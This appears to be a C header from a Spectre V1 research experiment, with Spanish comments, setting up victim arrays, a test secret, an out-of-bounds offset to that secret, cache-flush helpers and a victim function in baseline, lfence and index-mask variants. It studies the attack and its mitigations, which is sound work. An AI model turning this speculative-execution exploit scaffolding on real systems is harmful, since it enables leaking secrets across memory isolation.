#ifndef SPECTRE_H
#define SPECTRE_H

#include "common.h"

#define ARRAY1_SIZE 16
#define ARRAY1_ALLOC 160
#define SECRET_LEN 40
#define ARRAY2_STRIDE 512
#define ARRAY2_SIZE (256 * ARRAY2_STRIDE)

/*
 * Layout del PoC original: array1 tiene 160 bytes (16 válidos y relleno) y
 * el secreto vive aparte, en .rodata. malicious_x se calcula como la
 * diferencia de direcciones, igual que en el código de Kocher. Es una
 * resta de punteros entre objetos, pero es la disposición que reproduce la
 * fuga en x86-64 con GCC y la que usa el artículo.
 */
static uint8_t array1[ARRAY1_ALLOC] = {
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16
};

static const char secret_text[SECRET_LEN + 1] =
    "Spectre V1 test secret 0123456789ABCDEF!";
_Static_assert(sizeof(secret_text) - 1 == SECRET_LEN,
               "secret_text debe tener exactamente SECRET_LEN bytes");

static uint8_t array2[ARRAY2_SIZE] __attribute__((aligned(64)));
static uint8_t temp = 0;

/* Variable, no constante: E2 la expulsa de caché para alargar la ventana
 * especulativa del chequeo de límites, igual que el PoC original. */
static volatile unsigned int array1_size = ARRAY1_SIZE;

static inline size_t malicious_x_for_byte(size_t byte) {
    return (size_t)((uintptr_t)secret_text - (uintptr_t)array1) + byte;
}

#if defined(VARIANT_LFENCE)
#define VARIANT_NAME "lfence"
#elif defined(VARIANT_MASK)
#define VARIANT_NAME "mask"
#else
#define VARIANT_NAME "baseline"
#endif

/*
 * La variante base debe conservar un salto condicional real. Por eso el
 * Makefile compila E2/E3 con -fno-if-conversion -fno-if-conversion2.
 * La variante mask no debe contener un salto: el índice se anula si x está
 * fuera de rango, pero el acceso a array2 se ejecuta igual.
 */
__attribute__((noinline))
static void victim_function(size_t x) {
#if defined(VARIANT_LFENCE)
    if (x < array1_size) {
        lfence();
        temp &= array2[array1[x] * ARRAY2_STRIDE];
    }
#elif defined(VARIANT_MASK)
    size_t mask = -(size_t)(x < array1_size);
    size_t idx = x & mask;
    temp &= array2[array1[idx] * ARRAY2_STRIDE];
#else
    if (x < array1_size) {
        temp &= array2[array1[x] * ARRAY2_STRIDE];
    }
#endif
}

static inline void flush_array2(void) {
    for (size_t i = 0; i < 256; i++)
        clflush(&array2[i * ARRAY2_STRIDE]);
}

static inline void flush_array1_size(void) {
    clflush((volatile void *)&array1_size);
}

#endif
